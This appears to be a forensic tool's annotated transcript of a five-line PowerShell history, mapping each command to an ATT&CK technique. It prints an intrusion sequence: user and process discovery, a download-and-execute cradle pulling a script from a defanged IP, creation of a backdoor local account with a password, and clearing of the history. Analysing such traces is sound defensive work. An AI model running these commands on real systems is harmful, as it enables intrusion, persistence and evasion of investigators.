# `ConsoleHost_history.txt`: interlinear transcript

Sources: `ConsoleHost_history.txt` (sha256 `43ad91803155`…, 5 lines)

Glosses: 5 rule, 0 model, 0 analyst, 0 none, 0 pending · rules `2026.10.6` · ATT&CK `20.0`

## `ConsoleHost_history.txt`

```text
   1  whoami /all
      T1033 System Owner/User Discovery   [rule: whoami-id]
      Checks which user the session is running as.

   2  Get-Process | Select-Object Name
      T1057 Process Discovery   [rule: process-list]
      Lists running processes, for example to spot security tools or competing malware.

   3  iwr hxxps://198.51.100[.]20/p.ps1 | iex
      T1105 Ingress Tool Transfer · T1059.001 PowerShell   [rule: powershell-download-cradle]
      Downloads PowerShell code and runs it in memory without saving it.

   4  net user helpdesk Winter2026! /add
      T1136.001 Local Account   [rule: account-create]
      Creates a new local account, often a backdoor login.

   5  Clear-History
      T1070.003 Clear Command History   [rule: clear-history]
      Erases the shell command history to hide what was run.
```

## Warnings

- `ConsoleHost_history.txt: line 3: Invoke-Expression or a PowerShell alias, module or type can change how later commands run; no line from there on is labeled context`
